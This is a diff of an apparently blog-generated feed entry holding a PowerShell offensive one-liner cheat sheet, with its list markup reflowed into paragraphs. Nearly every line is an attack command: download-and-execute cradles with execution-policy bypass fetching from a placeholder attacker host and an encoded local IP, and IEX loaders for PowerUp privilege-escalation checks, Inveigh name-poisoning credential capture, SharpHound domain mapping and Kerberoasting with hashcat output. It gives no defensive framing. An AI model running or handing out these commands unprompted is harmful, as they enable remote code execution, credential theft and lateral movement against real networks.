@@ -22,55 +22,28 @@
 <p>Oneliners/commands for powershell.</p>
 </blockquote>
 
-<p>##Test</p>
-
 <h2 id="base64">Base64</h2>
 
-<ul>
-<li><p>Simple string encode</p>
+<p>Simple string encode</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Convert]</span>::ToBase64String(<span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetBytes(<span style="color:#e6db74">&#34;ENCODE THIS :  </span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">STR</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74"> !&#34;</span>))</code></pre></div>
-<ul>
-<li>Simple string decode
-<code>powershell
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&quot;))
-</code></li>
-</ul></li>
-</ul>
-
+<p>Simple string decode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String(<span style="color:#e6db74">&#34;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&#34;</span>))</code></pre></div>
 <h2 id="download-exec">Download/Exec</h2>
 
-<ul>
-<li><p>HTTP cleartext dl/exec</p>
+<p>HTTP cleartext dl/exec</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -c <span style="color:#e6db74">&#34;(New-Object Net.WebClient).DownloadString(&#39;http://IP:PORT/a.html&#39;)&#34;</span></code></pre></div>
-<ul>
-<li>HTTP encoded dl/exec
-<code>powershell
-powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===
-</code></li>
-</ul></li>
-</ul>
-
+<p>HTTP encoded dl/exec</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===</code></pre></div>
 <h2 id="exec-useful-modules">Exec useful modules</h2>
 
-<ul>
-<li><p>PowerUp.ps1 / Invoke-Allchecks</p>
+<p>PowerUp.ps1 / Invoke-Allchecks</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span></code></pre></div>
-<ul>
-<li>Inveigh.ps1 / Responder
-<code>powershell
-powershell.exe -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&quot;
-</code></li>
-</ul></li>
-
-<li><p>Bloodhound</p>
+<p>Inveigh.ps1 / Responder</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&#34;</span></code></pre></div>
+<p>Bloodhound</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1&#39;);Invoke-BloodHound&#34;</span></code></pre></div>
-<ul>
-<li>Invoke-Kerberoast
-<code>powershell
-powershell.exe -exec Bypass -C &quot;IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat  | fl&quot;
-</code></li>
-</ul></li>
-</ul>]]></content>
+<p>Invoke-Kerberoast</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat hashcat  | fl&#34;</span></code></pre></div>]]></content>
         </item>
         
         <item>
